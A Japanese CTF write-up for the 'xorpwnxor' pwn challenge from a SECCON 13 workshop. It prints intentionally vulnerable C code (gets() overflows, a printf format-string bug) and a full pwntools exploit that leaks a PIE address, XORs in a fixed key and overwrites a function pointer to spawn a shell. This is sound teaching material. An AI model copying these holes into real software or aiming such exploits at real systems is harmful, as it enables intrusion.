---
title: "【SECCON】RWPL WorkShop Pwn Challenge - xorpwnxor【Writeup】"
emoji: "💀"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [CTF, pwn, Security, gdb]
published: true 
---

# はじめに
2025/3/1に実施した[SECCON 13 電脳会議](https://www.seccon.jp/13/ep250301.html)のRWPL WorkShopで提供したおまけPwn問題のWriteUpです。

問題については以下のリポジトリにて公開しています（Pwnだけじゃなく本題のWeb hacking用の問題もあります）。
https://github.com/RWPL/seccon13-workshop

RWPLについては以下のHPを参照してみてください。
https://rwpl.github.io/

# 環境準備
## Toolsのインストール
お好きなx86のLinuxディストリビューション（筆者はkali linux）を用意して以下のToolをインストールしてください。

- gdb
- Python3
- [pwntools](https://github.com/Gallopsled/pwntools)
- [pwndbg](https://github.com/pwndbg/pwndbg)
- docker
- docker-compose

## 問題環境の構築
以下のコマンドで問題をダウンロードし、問題サーバを起動してください。
```bash
git clone  https://github.com/RWPL/seccon13-workshop
cd  seccon13-workshop/xorpwnxor
chmod +x chal
sudo docker-compose up
```
`nc localhost 4000`を実行し、以下のようなメッセージが表示されれば問題サーバが起動しています。

![1](/images/rwpl-xorpwnxor/1.png)


# xorpwnxor
実際に問題を解いていきます。
提供されている問題に関するファイルは以下の通りです。これらをみていきます。
- chal.c
- chal
## コード解析
まずは`chal.c`を見ていきます。
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct Object {
    char name[64];
    char description[128];

    void (*func)(struct Object *);
} Object;

unsigned long key;

void secret_function(Object *obj) {
    (void)obj;
    puts("This is a safe function.");
}

void win(Object *obj) {
    (void)obj;
    system("/bin/sh");
}

void call_func(Object *obj) {
    void (*decoded)(Object *);
    decoded = (void (*)(Object *))(((unsigned long) obj->func) ^ key);
    decoded(obj);
}

Object *create_object() {
    Object *obj = malloc(sizeof(Object));
    if (!obj) {
        exit(1);
    }
    memset(obj, 0, sizeof(Object));
    strncpy(obj->name, "default", sizeof(obj->name)-1);
    obj->func = (void (*)(Object *))(((unsigned long) secret_function) ^ key);
    return obj;
}

void edit_object(Object *obj) {
    printf("Edit description: ");
    gets(obj->description);
}

void rename_object(Object *obj) {
    printf("Rename (input new name): ");
    gets(obj->name);
}

void print_object(Object *obj) {
    printf("Name: ");
    printf(obj->name);
    printf("\n");
    printf("Description: %s\n", obj->description);
}

void delete_object(Object *obj) {
    free(obj);
}

int main() {
    setbuf(stdout, NULL);
    key = rand();

    Object *obj = create_object();
    int choice;

    while (1) {
        printf("\nMenu:\n");
        printf("1. View object\n");
        printf("2. Edit object description\n");
        printf("3. Rename object\n");
        printf("4. Call object's function\n");
        printf("5. Delete object\n");
        printf("6. Allocate new object\n");
        printf("7. Print libc info\n");
        printf("8. Exit\n");
        printf("Choice: ");
        scanf("%d", &choice);
        getchar();
        switch(choice) {
            case 1:
                print_object(obj);
                break;
            case 2:
                edit_object(obj);
                break;
            case 3:
                rename_object(obj);
                break;
            case 4:
                call_func(obj);
                break;
            case 5:
                delete_object(obj);
                break;
            case 6:
                obj = create_object();
                break;
            case 7:
                printf("puts address: %p\n", puts);
                break;
            case 8:
                exit(0);
                break;
            default:
                printf("Invalid choice.\n");
        }
    }
    return 0;
}
```
1-8の機能があり、構造体をいじくっていく機能がありそうです。ヒープ問題な匂いがしますね。

気になる機能としては`case 4`の`call_func`です。`call_func`は`obj->func`を呼び出していますが、その前に`key`で`obj->func`をxorしています。
`create_object`で`obj->func`に`secret_function`をxorしているので、`call_func`で`secret_function`を呼び出すといった流れに見えます。
確認してみます。
![2](/images/rwpl-xorpwnxor/2.png)
呼び出していますね。ではこの`secret_function`のXORされたアドレスを`win`のXORされたアドレスに書き換えて`win`を呼び出せばShellをゲット出来そうです。

また`edit_object`に関しては`gets`が使われて入力を受け付けています。特段入力制限やObjectの状態を見ていないので、ここにHeap Buffer OverflowやUAF（freeしたHeapに色々できそう）の脆弱性が存在しそうです。
`rename_object`に関してもHeap Buffer OverflowやUAFの脆弱性が同様にありそうです。

`print_object`に関しては以下のように`printf(obj->name)`で直接`obj->name`を出力しているので、FSB（Format String Bug）の脆弱性がありそうです。
```c
void print_object(Object *obj) {
    printf("Name: ");
    printf(obj->name);
    printf("\n");
    printf("Description: %s\n", obj->description);
}
```
諸々脆弱性があるので何を使っていくか迷いますが、**基本的に`obj->func`の`secret_function`を`win`に書き換える** のがゴールになりそうですね。

では実際に`chal`を動かしてみます。

## 動的解析
`chal`を動かしてみます。pwndgbを使って解析していきます。`gdbinit`fileに以下の設定を追加しておくと便利です。
```bash
# gdbinitにpwndbgをインストールしたディレクトリのgdbinit.pyを読み込む
source /[to_path_pwngdb]/pwndbg/gdbinit.py
```
以下のコマンドで`chal`を動かします。
```bash
gdb ./chal
```
次に`checksec`でバイナリのセキュリティ機構を確認します。
セキュリティ機構の各項目がどのようなものなのかは以下のリンクを参照してください。
https://miso-24.hatenablog.com/entry/2019/10/16/021321

確認した結果は以下です。
![3](/images/rwpl-xorpwnxor/3.png)
`PIE enabled`になっているので`win`のアドレスを特定するのが難しくなりそうです。

適当に以下の実行をしてHeapの状態を確認してみます。

![4](/images/rwpl-xorpwnxor/4.png)

`vis`コマンドでHeapの状態を視覚的に確認できます。

![5](/images/rwpl-xorpwnxor/5.png)

`edit_object`を利用して`description`領域に対して`0x80`以上のバイトを注入してHeap Buffer Overflowを実施し、`secret_function`のアドレスを`win`のアドレスに書き換えることが出来そうなですね。

というわけで以下2つの情報を取得出来れば、Exploitが成功しそうです。

1. `key`の情報
2. `win`のアドレス（`PIE enabled`によって実行ごとにアドレスが変化するため）

### keyの特定
`key`がどういった値を取るのか実際に確認してみます。
以下コマンドで`key`が呼び出されている位置をみます。
```bash
disass call_func
```
![6](/images/rwpl-xorpwnxor/6.png)
`0x55555555533b`で`rax`に`key`を格納する命令があります。ここにブレークポイントを設定します。
![7](/images/rwpl-xorpwnxor/7.png)
4の`call_func`を実行してみます。
![8](/images/rwpl-xorpwnxor/8.png)
`n`で実行を進めてやると、`rax`に`key`の値が格納されていることがわかります。
![9](/images/rwpl-xorpwnxor/9.png)

次の命令で`rax`と`rdx`をXORしているので、この`0x6b8b4567`が`key`として使われていることがわかりますが、コードでは`key = rand();`で呼び出されているので毎回変わる可能性があります。
ですが待ってください。このコード、Seedを指定してないので値が固定されそうですね。

何度か実行してみればわかりますが、この`0x6b8b4567`の値が変化することはありません。
なので、`key`は`0x6b8b4567`として固定されていることがわかりました。

### winのアドレスの特定
`win`のアドレスを特定するためにFSBの脆弱性を利用します。FSBはスタック上のデータリークやメモリへの書き込みによる改ざんが可能な便利な脆弱性です。
FSBについてもっと知りたい方は以下のリンクなどを参照してください。

https://ptr-yudai.hatenablog.com/entry/2018/10/06/234120

今回は`chal`がどのアドレスにマップされているか確認したいのでメモリリークを行います。
一応現在のメモリマップを確認します。`vmmap`というコマンドで確認できます。

![10](/images/rwpl-xorpwnxor/10.png)

メモリリークを行う為、`obj->name`に設定する文字をPythonで簡易に作成します。
```python
print(','.join(f'%{i}$p' for i in range(1,10)))
```
![11](/images/rwpl-xorpwnxor/11.png)

これを`rename_object`で入力し、`print_object`で出力させます。
![12](/images/rwpl-xorpwnxor/12.png)
`%9$p`で出力されている`0x555555555600`の値がどのアドレス領域なのか確認します。
![13](/images/rwpl-xorpwnxor/13.png)
`chal`のアドレス領域が確認できました。このリークされたアドレスから`win`のアドレスが相対的にどれくらい離れているのか計算します。
まず、`inf func`コマンドで現在の`win`のアドレスが確認できます。
![14](/images/rwpl-xorpwnxor/14.png)
`0x00005555555552fb`にありそうですね。では`win`のアドレスとリークされたアドレスの差を計算します。
![15](/images/rwpl-xorpwnxor/15.png)
リークアドレスから`0x305`ほど離れたアドレスが`win`のアドレスに当たりそうです。

これで`key`と`win`のアドレスが特定できたので、Exploitを書いていきます。

## Exploit
以下のPythonコードを用意してExploitを実行できます。
```python
from pwn import *
import time

binfile = './chal'
rhost = 'localhost'
rport = 4000 

gdb_script = '''
vis
'''

elf = ELF(binfile)
context.binary = elf

def conn():
    if args.REMOTE:
        p = remote(rhost, rport)
    else:
        p = process(elf.path)
    return p

p = conn()

def view_obj():
    p.sendlineafter(b'Choice:', b'1')
    p.recvuntil(b'Name: ')
    name = p.recvline()[:-1]
    p.recvuntil(b'Description: ')
    desc = p.recvline()[:-1]
    return name, desc

def edit_obj(desc):
    p.sendlineafter(b'Choice:', b'2')
    p.sendlineafter(b'description: ', desc)

def rename_obj(name):
    p.sendlineafter(b'Choice:', b'3')
    p.sendlineafter(b'name): ', name)
    
def call_obj():
    p.sendlineafter(b'Choice:', b'4')
  
key = 0x6b8b4567 # no seed    
rename_obj(b'%9$p')
leak, _ = view_obj()
print("Leak addr: ", leak)

win = int(leak,16) - (0x555555555600-0x00005555555552fb) # 0x305
print("Win: ", hex(win))

payload = b'A'*0x80
payload += pack(win^key)

edit_obj(payload)

# gdb.attach(p, gdbscript=gdb_script)
# time.sleep(1)
call_obj()

p.interactive()
```
:::message 
以下のコメントアウトを外してgdbを使ってExploit途中の状態を確認できます。
お好きな位置にこのコードを追加して見ると、メモリの挙動が確認でき面白いと思います。

※デフォルトで`vis`コマンドを打つようにしています。
:::
```python
gdb_script = '''
vis
'''

# gdb.attach(p, gdbscript=gdb_script)
# time.sleep(1)
```
実行するとこのようにShellをゲットできます。
![16](/images/rwpl-xorpwnxor/16.png)

# おわりに
今回はSECCON 13 電脳会議のRWPL Workshopで提供したPwn問題のWriteUpを記載しました。
皆さん楽しんで頂けたなら幸いです。